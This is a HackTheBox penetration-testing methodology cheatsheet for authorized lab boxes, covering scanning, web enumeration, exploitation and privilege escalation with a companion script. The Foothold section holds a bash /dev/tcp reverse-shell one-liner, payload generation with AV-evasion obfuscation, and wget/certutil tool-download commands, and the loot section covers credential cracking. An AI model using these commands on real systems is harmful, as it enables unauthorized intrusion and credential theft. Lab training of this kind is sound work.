# HackTheBox Methodology Cheatsheet

A repeatable workflow for HTB boxes: **Enumerate → Foothold → Privilege Escalation → Loot**.
Only run this against machines you're authorized to test (HTB labs or your own systems).

> Quick start with the companion script (full details in `boxer-howto.md`):
> ```
> ./boxer.sh install                 # tools + AutoRecon + PEASS-ng + RootHound + nuclei
> ./boxer.sh roothound               # (background) auto-graph privesc from linPEAS uploads
> ./boxer.sh workspace blue          # prompt IP -> /etc/hosts -> offers to run AutoRecon
> ```
> While AutoRecon runs, `websurface` flags web entry points (uploads/logins/POST)
> into `~/htb/blue/web-attack-surface.txt`. After discovery, `webscan` runs nikto +
> nuclei + sqlmap for active vulnerability scanning. After you get a shell, run
> linPEAS on the target and upload it to `~/htb/blue/loot/` — `roothound` builds the graph.

---

## 0. Setup / connect

- Connect VPN: `./boxer.sh vpn lab.ovpn` → confirm with `ip a show tun0`.
- Ping-check the box (some block ICMP; use `-Pn` in nmap if so).
- Add hostnames to `/etc/hosts` when a box uses vhosts: `10.10.10.x  box.htb`.

---

## 1. Enumeration (the phase that decides the box)

**Rule of thumb: 80% of HTB is enumeration. If you're stuck, you haven't enumerated enough.**

### Port & service discovery
```bash
# Full TCP sweep, then targeted service/version scan (the script does both)
nmap -p- --min-rate 2000 -T4 -Pn <ip> -oN allports.txt
nmap -sC -sV -p <open,ports> -Pn <ip> -oN services.txt
# UDP top ports (slow but catches SNMP/TFTP/etc.)
sudo nmap -sU --top-ports 50 -Pn <ip>
```

### By service
| Port | Service | First moves |
|------|---------|-------------|
| 21 | FTP | Try `anonymous`/`anonymous`; check for writable dirs |
| 22 | SSH | Note version; look for creds/keys elsewhere before brute forcing |
| 80/443/8080 | HTTP(S) | `whatweb`, view source, `/robots.txt`, dir brute (ffuf/gobuster), vhost fuzz |
| 139/445 | SMB | `smbclient -N -L //<ip>`, `enum4linux -a`, null sessions, share hunting |
| 111/2049 | NFS | `showmount -e <ip>`, mount exports |
| 3306/5432/1433 | DB | Default creds, `mysql -h`, `mssqlclient.py` |
| 3389 | RDP | Version, NLA state; creds reuse |
| 161 (UDP) | SNMP | `onesixtyone`, `snmpwalk -c public -v1` |
| 25/110/143 | Mail | `smtp-user-enum`, VRFY |

### Web enumeration checklist
```bash
ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301,302,401,403
gobuster vhost -u http://box.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
nikto -host http://<ip>
```
- Read page source & JS for endpoints, comments, creds.
- Identify the CMS/framework/version → search known CVEs.
- Test login forms for default creds and SQLi.
- Look for LFI/RFI, file upload, SSTI, IDOR, exposed `.git`/backups.
- Hunt for leaked secrets in pages, JS, and JSON (creds, API keys, tokens):
  `./boxer.sh secrets <ip> <box>` — automated crawl + regex scan.
- **Active vulnerability scan** — nikto + nuclei + sqlmap in one command:
  `./boxer.sh webscan <ip> <box>` (see below).

### Web vulnerability scanning (automated)

`./boxer.sh webscan` is the closest free equivalent to Burp Suite's active scanner.
Run it after initial recon; it chains three tools in sequence:

```bash
./boxer.sh webscan 10.10.10.40 blue       # bare IP
./boxer.sh webscan http://blue.htb blue   # or full URL
```

| Stage | Tool | What it finds |
|-------|------|---------------|
| 1 | **nikto** | Server misconfigs, default/dangerous files, outdated software, missing headers |
| 2 | **nuclei** | CVEs matched to the detected tech stack (Apache/PHP/IIS/WordPress/etc.), known exposures and misconfigurations |
| 3 | **sqlmap** | SQL injection (prompted — crawls 3 levels, non-aggressive) |

nuclei uses `-automatic-scan` — it fingerprints the stack with Wappalyzer and loads
only the relevant templates, so it's targeted rather than a kitchen-sink blast.
Results land in `~/htb/<box>/webscan/`. Run it **alongside** `secrets` for full coverage:

```bash
./boxer.sh webscan  <ip> <box>    # active vuln scan
./boxer.sh secrets  <ip> <box>    # passive: leaked creds/tokens in pages/JS/headers
./boxer.sh exploits <box>         # offline: known Exploit-DB entries for fingerprinted services
```

---

## 2. Foothold (initial access)

- **Map version → exploit:** `searchsploit <product version>`; check GitHub/Exploit-DB.
  Automated: `./boxer.sh exploits <box>` matches every fingerprinted service
  against Exploit-DB and lists known exploits (also runs at the end of AutoRecon).
  Remember a version match is a *lead*, not proof — read the exploit before running it.
  RCE-looking hits are tagged [RCE?]. To validate safely without exploiting, use a
  Metasploit module's `check`: `msfconsole -q -x "use <module>; set RHOSTS <ip>; check"`.
- **Default & reused creds:** try everywhere; credentials found on one service often unlock another.
- **Web to shell paths:** file upload → webshell; RCE via injection/SSTI; deserialization.
- **Generate a payload:** `./boxer.sh shell` (picker) or e.g.
  `./boxer.sh shell windows-exe <lhost> <lport>` — builds it with msfvenom into
  `~/htb/serve` and prints the matching nc / multi-handler listener. Add `1` (or
  `SHELL_VEIL=1`) for a Veil-obfuscated Windows variant (`-msf` vs `-veil` names);
  note HTB boxes have no AV, so evasion is for learning, not needed to solve them.
- **Get a reverse shell**, then stabilize it:
```bash
# listener
nc -lvnp 4444
# common payload (adjust IP/port)
bash -i >& /dev/tcp/<your-tun-ip>/4444 0>&1
# stabilize a Linux shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
```
- Grab `user.txt`. Record how you got in, in `notes.md`.
- **Auto-find flags:** stage with `./boxer.sh flags`, deliver, then on the box run
  `find-flags.sh` (Linux) / `find-flags.ps1` (Windows) to locate user.txt/root.txt.
- **Transfer tools to the box:** stage payloads on your host and pull them from the
  shell. HTTP (best if FTP is blocked): `./boxer.sh http` then on the target
  `wget http://<you>/<file>` / `certutil -urlcache -split -f http://<you>/<file> f`.
  Anonymous FTP: `./boxer.sh ftp` then `wget ftp://<you>/<file>`; `FTP_WRITE=1`
  lets the box upload loot back. The menu's option 12 prompts HTTP vs FTP.

---

## 3. Privilege Escalation

### Linux
```bash
# Automated (drop LinPEAS from your tools dir or transfer it)
./linpeas.sh
# Manual quick wins
id; sudo -l                       # sudo rights / GTFOBins
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
cat /etc/crontab; ls -la /etc/cron.*     # cron jobs
uname -a                          # kernel version -> kernel exploits
getcap -r / 2>/dev/null           # capabilities
```
Look at: writable files owned by root, service misconfigs, passwords in configs/history, GTFOBins for any binary you can run as root.

### Windows
```powershell
whoami /priv                      # SeImpersonate -> Potato attacks
systeminfo                        # patch level -> kernel exploits
# WinPEAS / PowerUp / SharpUp for automated checks
# Get compiled winPEAS:  ./boxer.sh peass   then deliver via ./boxer.sh ftp ~/htb/serve/peass
```
Look at: unquoted service paths, weak service perms, AlwaysInstallElevated, stored creds, token privileges, AD misconfigs (BloodHound).

---

## 4. Loot & document

- Grab `root.txt` / `proof.txt`.
- Dump credentials/hashes; try reuse and cracking:
```bash
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
- Fill in `notes.md`: every port, cred, and step — future boxes reuse the same tricks.

---

## Stuck? Reset checklist
1. Re-scan all ports (did you miss a high port or UDP?).
2. Re-read web source / try a bigger wordlist / fuzz vhosts & params.
3. Reuse every credential you've found on every service.
4. Check the box's difficulty & tags — align expectations.
5. Walk away, then re-read your own notes. The clue is usually already written down.

---

## Handy references
- GTFOBins — https://gtfobins.github.io (Linux privesc via binaries)
- LOLBAS — https://lolbas-project.github.io (Windows living-off-the-land)
- HackTricks — https://book.hacktricks.xyz (comprehensive technique wiki)
- PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings
- Reverse Shell Generator — https://www.revshells.com
